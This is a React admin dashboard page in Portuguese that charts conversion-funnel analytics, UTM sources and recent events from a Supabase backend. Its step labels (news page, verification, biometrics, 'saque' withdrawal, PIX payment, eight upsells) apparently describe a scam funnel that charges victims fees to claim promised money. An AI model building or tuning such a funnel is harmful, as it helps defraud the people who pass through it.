import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { 
  BarChart3, 
  Users, 
  TrendingUp, 
  LogOut, 
  RefreshCw,
  Loader2,
  Calendar
} from "lucide-react";
import { ChartContainer, ChartTooltip, ChartTooltipContent } from "@/components/ui/chart";
import { BarChart, Bar, XAxis, YAxis, ResponsiveContainer, Cell } from "recharts";

interface FunnelStep {
  step: string;
  count: number;
  dropoff?: number;
}

interface AnalyticsData {
  totalSessions: number;
  funnelSteps: FunnelStep[];
  recentEvents: Array<{
    step: string;
    created_at: string;
    utm_source: string | null;
  }>;
  utmSources: Array<{
    source: string;
    count: number;
  }>;
}

type Period = '24h' | '7d' | '30d';

const STEP_LABELS: Record<string, string> = {
  'noticia': 'Notícia',
  'verificacao': 'Verificação',
  'login': 'Login',
  'verificando': 'Verificando',
  'confirma-dados': 'Confirma Dados',
  'biometria': 'Biometria',
  'video': 'Vídeo',
  'chat': 'Chat',
  'saque': 'Saque',
  'pix-generated': 'PIX Gerado',
  'payment-confirmed': 'Pagamento',
  'upsell-1': 'Upsell 1',
  'upsell-2': 'Upsell 2',
  'upsell-3': 'Upsell 3',
  'upsell-4': 'Upsell 4',
  'upsell-5': 'Upsell 5',
  'upsell-6': 'Upsell 6',
  'upsell-7': 'Upsell 7',
  'upsell-8': 'Upsell 8',
};

const Admin = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [period, setPeriod] = useState<Period>('24h');
  const [analytics, setAnalytics] = useState<AnalyticsData | null>(null);
  const adminName = localStorage.getItem('admin_name') || 'Admin';

  const verifyAndFetchData = async (showLoading = true) => {
    const token = localStorage.getItem('admin_token');
    
    if (!token) {
      navigate('/admin/login');
      return;
    }

    if (showLoading) setLoading(true);
    else setRefreshing(true);

    try {
      // Verify token
      const verifyResponse = await supabase.functions.invoke('admin-verify', {
        body: { token },
      });

      if (!verifyResponse.data?.valid) {
        localStorage.removeItem('admin_token');
        localStorage.removeItem('admin_name');
        navigate('/admin/login');
        return;
      }

      // Fetch analytics
      const analyticsResponse = await supabase.functions.invoke('admin-analytics', {
        body: { token, period },
      });

      if (analyticsResponse.data?.success) {
        setAnalytics(analyticsResponse.data.data);
      }
    } catch (error) {
      console.error('Error fetching data:', error);
      toast({
        title: "Erro ao carregar dados",
        description: "Tente novamente",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    verifyAndFetchData();
  }, [period]);

  const handleLogout = () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_name');
    navigate('/admin/login');
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  // Calculate conversion rate
  const getConversionRate = () => {
    if (!analytics?.funnelSteps?.length) return 0;
    const loginStep = analytics.funnelSteps.find(s => s.step === 'login');
    const paymentStep = analytics.funnelSteps.find(s => s.step === 'payment-confirmed');
    if (!loginStep?.count) return 0;
    return ((paymentStep?.count || 0) / loginStep.count * 100).toFixed(1);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-primary" />
      </div>
    );
  }

  const chartConfig = {
    count: {
      label: "Usuários",
      color: "hsl(var(--primary))",
    },
  };

  // Prepare chart data
  const chartData = analytics?.funnelSteps?.map((step, index, arr) => {
    const prevCount = index > 0 ? arr[index - 1].count : step.count;
    const dropoff = prevCount > 0 ? ((prevCount - step.count) / prevCount * 100).toFixed(1) : '0';
    return {
      name: STEP_LABELS[step.step] || step.step,
      count: step.count,
      dropoff: parseFloat(dropoff),
    };
  }) || [];

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b bg-card sticky top-0 z-10">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div>
            <h1 className="text-xl font-bold">Dashboard Admin</h1>
            <p className="text-sm text-muted-foreground">Olá, {adminName}</p>
          </div>
          <div className="flex items-center gap-2">
            <Button 
              variant="outline" 
              size="icon"
              onClick={() => verifyAndFetchData(false)}
              disabled={refreshing}
            >
              <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin' : ''}`} />
            </Button>
            <Button variant="outline" onClick={handleLogout}>
              <LogOut className="w-4 h-4 mr-2" />
              Sair
            </Button>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 space-y-6">
        {/* Period Selector */}
        <div className="flex gap-2">
          {(['24h', '7d', '30d'] as Period[]).map((p) => (
            <Button
              key={p}
              variant={period === p ? 'default' : 'outline'}
              size="sm"
              onClick={() => setPeriod(p)}
            >
              <Calendar className="w-4 h-4 mr-1" />
              {p === '24h' ? 'Hoje' : p === '7d' ? '7 dias' : '30 dias'}
            </Button>
          ))}
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Card>
            <CardHeader className="pb-2">
              <CardDescription>Total de Sessões</CardDescription>
              <CardTitle className="text-3xl flex items-center gap-2">
                <Users className="w-6 h-6 text-primary" />
                {analytics?.totalSessions || 0}
              </CardTitle>
            </CardHeader>
          </Card>
          
          <Card>
            <CardHeader className="pb-2">
              <CardDescription>Taxa de Conversão</CardDescription>
              <CardTitle className="text-3xl flex items-center gap-2">
                <TrendingUp className="w-6 h-6 text-green-500" />
                {getConversionRate()}%
              </CardTitle>
            </CardHeader>
          </Card>
          
          <Card>
            <CardHeader className="pb-2">
              <CardDescription>Pagamentos Confirmados</CardDescription>
              <CardTitle className="text-3xl flex items-center gap-2">
                <BarChart3 className="w-6 h-6 text-amber-500" />
                {analytics?.funnelSteps?.find(s => s.step === 'payment-confirmed')?.count || 0}
              </CardTitle>
            </CardHeader>
          </Card>
        </div>

        {/* Funnel Chart */}
        <Card>
          <CardHeader>
            <CardTitle>Funil de Conversão</CardTitle>
            <CardDescription>Quantidade de usuários em cada etapa</CardDescription>
          </CardHeader>
          <CardContent>
            <ChartContainer config={chartConfig} className="h-[300px] w-full">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={chartData} layout="vertical" margin={{ left: 100 }}>
                  <XAxis type="number" />
                  <YAxis dataKey="name" type="category" width={90} tick={{ fontSize: 12 }} />
                  <ChartTooltip content={<ChartTooltipContent />} />
                  <Bar dataKey="count" radius={4}>
                    {chartData.map((entry, index) => (
                      <Cell 
                        key={`cell-${index}`} 
                        fill={`hsl(var(--primary) / ${1 - index * 0.05})`} 
                      />
                    ))}
                  </Bar>
                </BarChart>
              </ResponsiveContainer>
            </ChartContainer>
          </CardContent>
        </Card>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Recent Events */}
          <Card>
            <CardHeader>
              <CardTitle>Eventos Recentes</CardTitle>
              <CardDescription>Últimos 20 eventos do funil</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-2 max-h-[400px] overflow-auto">
                {analytics?.recentEvents?.length ? (
                  analytics.recentEvents.map((event, index) => (
                    <div 
                      key={index} 
                      className="flex items-center justify-between p-2 rounded-lg bg-muted/50 text-sm"
                    >
                      <span className="font-medium">
                        {STEP_LABELS[event.step] || event.step}
                      </span>
                      <div className="flex items-center gap-3 text-muted-foreground">
                        <span className="text-xs bg-primary/10 px-2 py-0.5 rounded">
                          {event.utm_source || 'direto'}
                        </span>
                        <span className="text-xs">{formatDate(event.created_at)}</span>
                      </div>
                    </div>
                  ))
                ) : (
                  <p className="text-muted-foreground text-sm">Nenhum evento encontrado</p>
                )}
              </div>
            </CardContent>
          </Card>

          {/* UTM Sources */}
          <Card>
            <CardHeader>
              <CardTitle>Fontes de Tráfego (UTM)</CardTitle>
              <CardDescription>Performance por fonte</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {analytics?.utmSources?.length ? (
                  analytics.utmSources.map((source, index) => {
                    const maxCount = analytics.utmSources[0]?.count || 1;
                    const percentage = (source.count / maxCount) * 100;
                    
                    return (
                      <div key={index} className="space-y-1">
                        <div className="flex justify-between text-sm">
                          <span className="font-medium">{source.source || 'Direto'}</span>
                          <span className="text-muted-foreground">{source.count}</span>
                        </div>
                        <div className="h-2 bg-muted rounded-full overflow-hidden">
                          <div 
                            className="h-full bg-primary rounded-full transition-all"
                            style={{ width: `${percentage}%` }}
                          />
                        </div>
                      </div>
                    );
                  })
                ) : (
                  <p className="text-muted-foreground text-sm">Nenhuma fonte encontrada</p>
                )}
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
};

export default Admin;
